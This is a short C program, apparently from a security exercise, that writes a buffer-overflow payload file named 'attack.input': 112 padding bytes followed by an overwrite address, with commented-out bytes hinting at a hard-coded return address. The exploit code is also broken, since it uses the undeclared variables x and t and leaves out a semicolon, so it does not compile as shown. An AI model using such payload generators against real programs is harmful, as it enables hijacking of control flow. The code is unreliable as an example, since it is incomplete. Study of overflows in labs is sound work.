#include <stdio.h>

int main (int argc, char *argv[])
{

        char tack[116];
        int i;
        for(i = 0; i < 112; i++){
                tack[i] = '0';
        }


        // tack[i++] = 0x7f;
        // tack[i++] = 0x8e;
        // tack[i++] = 0x04;
        // tack[i++] = 0x08;

        tack[i++] = x & 0x000000ff;
         x = x >> 8;
          t = x & 0xff;
          tack[i++] = t;
          x = x >> 8;
          t = x & 0xff;
          tack[i++] = t;
          x = x >> 8;
          t = x & 0xff
        tack[i++] = t;

        FILE* fp;
        fp = fopen("attack.input","w");
        if(fp == NULL){
                return 0;
        }
        fprintf(fp,"%s",tack);
        fclose(fp);
        return 1;
}